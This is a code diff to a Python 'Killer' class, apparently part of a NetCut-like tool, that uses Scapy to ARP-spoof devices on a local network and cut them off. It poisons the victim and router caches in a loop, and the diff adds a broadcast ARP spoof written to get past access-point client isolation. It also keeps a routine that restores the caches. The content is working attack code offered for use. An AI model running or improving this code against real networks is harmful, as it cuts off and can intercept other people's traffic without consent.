@@ -20,18 +20,34 @@ class Killer:
             print(victim.mac, 'is already killed.')
             return
 
+        if self.iface.name == 'NULL':
+            print(f'[Killer] Refusing to kill {victim.mac} — no valid interface resolved.')
+            return
+
         self.killed[victim.mac] = victim
 
         # Get your own MAC address
         my_mac = self.iface.mac
 
-        # Cheat Victim: Tell victim that router's IP is at YOUR MAC
+        # Cheat Victim: Tell victim that router's IP is at YOUR MAC (unicast reply)
         to_victim = Ether(dst=victim.mac)/ARP(
             op=2,                    # ARP Reply
             psrc=self.router.ip,     # Router's IP
             hwsrc=my_mac,           # YOUR MAC (the spoof)
             hwdst=victim.mac,       # Victim's MAC
             pdst=victim.ip          # Victim's IP
+        )
+
+        # Same claim, but broadcast — some APs with client/band isolation
+        # only drop direct unicast frames between clients while still
+        # flooding broadcast frames, so this can reach victims that the
+        # unicast reply above can't.
+        to_victim_broadcast = Ether(dst=GLOBAL_MAC)/ARP(
+            op=1,                    # ARP Request (gratuitous-style)
+            psrc=self.router.ip,     # Router's IP
+            hwsrc=my_mac,           # YOUR MAC (the spoof)
+            hwdst=GLOBAL_MAC,
+            pdst=victim.ip
         )
 
         print('to_victim but all in string:')
@@ -54,6 +70,7 @@ class Killer:
         while victim.mac in self.killed and self.iface.name != 'NULL':
             # Send packets to both victim and router
             sendp(to_victim, iface=self.iface.name, verbose=0)
+            sendp(to_victim_broadcast, iface=self.iface.name, verbose=0)
             sendp(to_router, iface=self.iface.name, verbose=0)
             # print('0000 ->', victim.mac, 'spoofed')
             sleep(wait_after)
@@ -64,7 +81,7 @@ class Killer:
         Unspoofing victim - Restore ARP cache to original state
         """
         self.killed.pop(victim.mac, None)  # Safe pop with default
-        
+
         # Fix Victim: Tell victim the router's REAL MAC
         to_victim = Ether(dst=victim.mac)/ARP(
             op=2,                        # ARP Reply (not request)
@@ -73,7 +90,7 @@ class Killer:
             hwdst=victim.mac,            # Victim's MAC
             pdst=victim.ip               # Victim's IP
         )
-        
+
         # Fix Router: Tell router the victim's REAL MAC
         to_router = Ether(dst=self.router.mac)/ARP(
             op=2,                        # ARP Reply (not request)
@@ -82,7 +99,7 @@ class Killer:
             hwdst=self.router.mac,       # Router's MAC
             pdst=self.router.ip          # Router's IP
         )
-        
+
         if self.iface.name != 'NULL':
             # Send multiple packets to ensure cache is updated
             print(f'Restoring ARP cache for {victim.mac}')
@@ -90,9 +107,9 @@ class Killer:
                 sendp(to_victim, iface=self.iface.name, verbose=0)
                 sendp(to_router, iface=self.iface.name, verbose=0)
                 sleep(0.1)  # Small delay between sends
-            
+
             print(f'Restored ARP cache for {victim.mac}')
-        
+
         print('unkilled', victim.mac)
 
     def kill_all(self, device_list: list[Device], exclude_macs: set = frozenset()):
@@ -140,7 +157,7 @@ class Killer:
             if all(old.mac != new.mac for new in new_devices):
                 print(f'Updating with old device: {old}')
                 new_devices.append(old)
-            
+
             if old.mac in exclude_macs:
                 continue
 
